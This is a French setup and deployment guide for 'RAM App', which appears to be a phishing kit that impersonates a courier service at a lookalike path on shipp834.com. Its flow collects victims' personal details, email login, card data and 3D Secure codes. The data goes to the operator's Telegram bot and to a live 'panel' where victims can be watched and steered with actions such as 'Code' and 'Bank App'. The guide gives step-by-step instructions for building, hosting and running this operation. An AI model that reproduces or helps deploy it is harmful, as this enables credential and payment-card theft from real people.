# 📚 Guide Complet - RAM App

Guide consolidé avec uniquement les méthodes qui fonctionnent.

---

## 📋 Table des matières

1. [Installation et Configuration Locale](#installation-et-configuration-locale)
2. [Configuration WebSocket sur Render](#configuration-websocket-sur-render)
3. [Déploiement VPS](#déploiement-vps)
4. [Commandes Utiles](#commandes-utiles)
5. [Dépannage](#dépannage)

---

## 🚀 Installation et Configuration Locale

### Prérequis

- **Node.js** (version 18 ou supérieure)
- **npm**
- Un **bot Telegram** configuré avec son token et chat ID

### Installation

#### 1. Installer les dépendances du client

```bash
cd ram-app/client
npm install
```

#### 2. Installer les dépendances du serveur

```bash
cd ram-app/server
npm install
```

### Configuration

#### Créer le fichier `.env` pour le client

Créez un fichier `.env` dans le dossier `ram-app/client/` :

```bash
cd ram-app/client
cp .env.example .env
```

Puis éditez le fichier `.env` avec vos informations :

```env
VITE_TELEGRAM_TOKEN=votre_token_bot_telegram
VITE_TELEGRAM_CHAT_ID=votre_chat_id_telegram
VITE_WS_HOST=localhost:8090
```

**Comment obtenir un bot Telegram :**
1. Ouvrez Telegram et cherchez `@BotFather`
2. Envoyez `/newbot` et suivez les instructions
3. Copiez le token fourni
4. Pour obtenir votre Chat ID, cherchez `@userinfobot` sur Telegram et envoyez-lui un message

### Démarrer le projet

Vous devez démarrer **2 serveurs** en parallèle :

#### Terminal 1 - Serveur WebSocket

```bash
cd ram-app/server
node index.js
```

Le serveur WebSocket démarrera sur le port **8090** par défaut.

Vous devriez voir :
```
WebSocket server listening on port 8090
```

#### Terminal 2 - Client React

```bash
cd ram-app/client
npm run dev
```

Le client React démarrera sur le port **3002** par défaut et s'ouvrira automatiquement dans votre navigateur.

Vous devriez voir :
```
  VITE v7.x.x  ready in xxx ms

  ➜  Local:   http://localhost:3002/
  ➜  Network: use --host to expose
```

### Tester l'application

#### 1. Tester le flux utilisateur

1. Ouvrez `http://localhost:3002/` dans votre navigateur
2. Vous serez redirigé vers `/track`
3. Remplissez le formulaire "Your informations"
4. Continuez avec le formulaire "Login" (email + mot de passe)
5. Remplissez les "Payment details"
6. Complétez le processus 3D Secure
7. Vérifiez que les messages arrivent dans Telegram

#### 2. Tester le Dashboard

1. Ouvrez `http://localhost:3002/panel` dans votre navigateur
2. Vous verrez tous les clients connectés en temps réel
3. Les données s'affichent au fur et à mesure que les utilisateurs remplissent les formulaires

### URLs importantes

- **Application principale** : `http://localhost:3002/`
- **Dashboard** : `http://localhost:3002/panel`
- **WebSocket Server** : `ws://localhost:8090`

### Base de données

La base de données SQLite est créée automatiquement dans `ram-app/server/clients.sqlite` lors du premier démarrage.

---

## 🌐 Configuration WebSocket sur Render

### 1. Déployer le serveur WebSocket sur Render

#### Créer un nouveau service Web Service

1. Allez sur [Render Dashboard](https://dashboard.render.com)
2. Cliquez sur **"New +"** → **"Web Service"**
3. Connectez votre repository GitHub

#### Configuration du service WebSocket

- **Name**: `ram-ws-backend` (ou un nom de votre choix)
- **Root Directory**: `ram-app/server`
- **Environment**: `Node`
- **Build Command**: `npm install`
- **Start Command**: `node index.js`
- **Plan**: Free ou Paid selon vos besoins

#### Variables d'environnement (optionnel)

- `PORT` : Render définit automatiquement cette variable
- `WS_PORT` : Alternative si vous préférez

#### Déployer

1. Cliquez sur **"Create Web Service"**
2. Attendez que le déploiement se termine
3. Notez l'URL du service (ex: `ram-ws-backend.onrender.com`)

### 2. Configurer VITE_WS_HOST dans le service Client

#### Aller dans les paramètres de votre service Client

1. Sur Render Dashboard, ouvrez votre service `ram-react-client`
2. Allez dans l'onglet **"Environment"**

#### Ajouter la variable d'environnement

1. Cliquez sur **"Add Environment Variable"**
2. **Key**: `VITE_WS_HOST`
3. **Value**: L'URL de votre serveur WebSocket **SANS** le protocole `wss://`
   - Exemple: `ram-ws-backend.onrender.com`
   - **⚠️ IMPORTANT**: Ne mettez PAS `wss://` ou `ws://` dans la valeur
   - Le code ajoutera automatiquement `wss://` pour les URLs non-localhost

#### Sauvegarder et redéployer

1. Cliquez sur **"Save Changes"**
2. Render redéploiera automatiquement votre service avec la nouvelle variable

### Format de VITE_WS_HOST

#### ✅ Correct
```
ram-ws-backend.onrender.com
```

#### ❌ Incorrect
```
wss://ram-ws-backend.onrender.com
ws://ram-ws-backend.onrender.com
https://ram-ws-backend.onrender.com
```

### Vérification

Après le redéploiement :

1. **Ouvrir le panel Dashboard**
   - Allez sur `https://ram-react-client.onrender.com/panel`
   - Ouvrez la console du navigateur (F12)

2. **Vérifier les messages**
   - Vous devriez voir : `WebSocket connected to: wss://ram-ws-backend.onrender.com`
   - Le panel devrait afficher : "Panel connecté ✅"

**Note importante** : Les variables d'environnement VITE_* sont injectées au moment du build. Si vous modifiez `VITE_WS_HOST`, vous devez redéployer le service client pour que les changements prennent effet.

---

## 🚀 Déploiement VPS

### Prérequis

- VPS avec Apache ou Nginx installé
- Accès SSH au VPS
- Domaine configuré

### Configuration pour votre cas

**URLs souhaitées** :
- Site : `https://shipp834.com/couriers.services.co.za/`
- Panel : `https://shipp834.com/couriers.services.co.za/panel`

### Étapes de déploiement

#### 1. Préparer le build localement

```bash
cd ram-app/client

# Créer/modifier .env si nécessaire
echo "VITE_WS_HOST=ram-ws-backend.onrender.com" >> .env
echo "VITE_BASE_PATH=/couriers.services.co.za/" >> .env

# Build l'application
npm run build
```

#### 2. Vérifier le build

```bash
# Vérifier que VITE_WS_HOST a été remplacé
grep "VITE_WS_HOST" dist/index.html
# Devrait afficher: window.VITE_WS_HOST = "ram-ws-backend.onrender.com";
```

#### 3. Transférer les fichiers sur le VPS

**Option A : Utiliser le script de déploiement**

```bash
cd ram-app/client
chmod +x deploy-vps.sh
./deploy-vps.sh votre-user@shipp834.com /var/www/html/couriers.services.co.za/
```

**Option B : Transfert manuel**

```bash
# Depuis votre machine locale
cd ram-app/client
scp -r dist/* user@shipp834.com:/var/www/html/couriers.services.co.za/
```

Ou utilisez FTP/SFTP pour transférer le contenu du dossier `dist/`.

#### 4. Structure sur le VPS

```
/var/www/html/couriers.services.co.za/
├── index.html
├── assets/
│   ├── index-xxx.js
│   ├── index-xxx.css
│   └── ...
├── .htaccess
└── (autres fichiers statiques)
```

#### 5. Configuration Apache

Le fichier `.htaccess` est déjà inclus dans le build. Assurez-vous que :

1. **mod_rewrite est activé** :
   ```bash
   sudo a2enmod rewrite
   sudo systemctl restart apache2
   ```

2. **Les permissions sont correctes** :
   ```bash
   sudo chown -R www-data:www-data /var/www/html/couriers.services.co.za/
   sudo chmod -R 755 /var/www/html/couriers.services.co.za/
   ```

---

## 📝 Commandes Utiles

### Développement

```bash
# Démarrer le client en mode développement
cd ram-app/client && npm run dev

# Démarrer le serveur WebSocket
cd ram-app/server && node index.js
```

### Production

```bash
# Build de production
cd ram-app/client && npm run build

# Vérifier le build
cd ram-app/client && grep "VITE_WS_HOST" dist/index.html
```

### Déploiement

```bash
# Déployer sur VPS avec le script
cd ram-app/client && ./deploy-vps.sh

# Créer une archive pour déploiement manuel
cd ram-app/client && tar -czf deploy-dist.tar.gz dist/
```

---

## 🔐 Variables d'environnement

| Variable | Description | Défaut | Où configurer |
|----------|-------------|--------|---------------|
| `VITE_TELEGRAM_TOKEN` | Token du bot Telegram | Requis | `.env` (local) ou Render |
| `VITE_TELEGRAM_CHAT_ID` | ID du chat Telegram | Requis | `.env` (local) ou Render |
| `VITE_WS_HOST` | Host du serveur WebSocket | `localhost:8090` | `.env` (local) ou Render |
| `VITE_BASE_PATH` | Chemin de base pour le déploiement | `./` | `.env` (local) |
| `PORT` ou `WS_PORT` | Port du serveur WebSocket | `8090` | Render (automatique) |

---

## 🐛 Dépannage

### Le WebSocket ne se connecte pas (local)

- Vérifiez que le serveur WebSocket est bien démarré sur le port 8090
- Vérifiez que le port 8090 n'est pas utilisé par un autre processus
- Vérifiez la variable `VITE_WS_HOST` dans le fichier `.env`

### Le Dashboard ne se connecte pas (production)

1. **Vérifier que le serveur WebSocket est démarré**
   - Allez sur les logs de votre service WebSocket sur Render
   - Vous devriez voir : `WebSocket server listening on port XXXX`

2. **Vérifier la variable d'environnement**
   - Dans Render → Service Client → Environment
   - Vérifiez que `VITE_WS_HOST` existe et a la bonne valeur
   - **Redéployez** après avoir modifié les variables d'environnement

3. **Vérifier l'URL dans la console**
   - Ouvrez la console du navigateur (F12)
   - Regardez l'URL tentée dans le message d'erreur
   - Elle devrait être : `wss://ram-ws-backend.onrender.com`

### Les messages Telegram ne sont pas envoyés

- Vérifiez que `VITE_TELEGRAM_TOKEN` et `VITE_TELEGRAM_CHAT_ID` sont correctement configurés dans `.env`
- Vérifiez que le bot Telegram est actif
- Vérifiez la console du navigateur pour les erreurs

### Le build échoue

- Vérifiez que toutes les dépendances sont installées : `npm install`
- Vérifiez que Node.js est en version 18 ou supérieure
- Vérifiez les logs d'erreur pour plus de détails

### Les clients n'apparaissent pas dans le panel

1. **Vérifier la connexion WebSocket**
   - Ouvrez la console du navigateur (F12)
   - Vérifiez les logs `[Socket]` pour voir si le client se connecte

2. **Vérifier les logs du serveur**
   - Dans Render → Service WebSocket → Logs
   - Vous devriez voir : `Client registered: [clientId]`
   - Vous devriez voir : `Broadcasting to X dashboard(s)`

3. **Vérifier que le panel est connecté**
   - Le panel devrait afficher "Panel connecté ✅"
   - Vérifiez les logs dans la console du navigateur

---

## 📦 Structure du projet

```
ram-app/
├── client/          # Application React
│   ├── src/
│   │   ├── pages/   # Pages de l'application
│   │   ├── components/ # Composants réutilisables
│   │   └── utils/    # Utilitaires (messageBuilder, validation)
│   ├── public/      # Fichiers statiques
│   │   └── assets/js/socket.js  # Script WebSocket client
│   ├── dist/        # Build de production
│   └── .env         # Variables d'environnement
│
└── server/          # Serveur WebSocket Node.js
    ├── index.js     # Serveur principal
    └── clients.sqlite # Base de données SQLite (créée automatiquement)
```

---

## ✅ Vérification finale

Une fois configuré correctement :

1. ✅ Le Dashboard se connecte au WebSocket
2. ✅ Vous voyez "Panel connecté ✅" en vert
3. ✅ La liste des clients s'affiche (même si vide au début)
4. ✅ Les actions du Dashboard fonctionnent (Code, Bank App, etc.)
5. ✅ Les clients apparaissent en temps réel dans le panel
6. ✅ Les notifications sont reçues correctement

---

## 📞 Support

Pour toute question ou problème :

1. Vérifiez d'abord la section Dépannage ci-dessus
2. Consultez les logs dans la console du navigateur (F12)
3. Consultez les logs du serveur WebSocket sur Render
4. Vérifiez que toutes les variables d'environnement sont correctement configurées

---

**Dernière mise à jour** : Décembre 2024
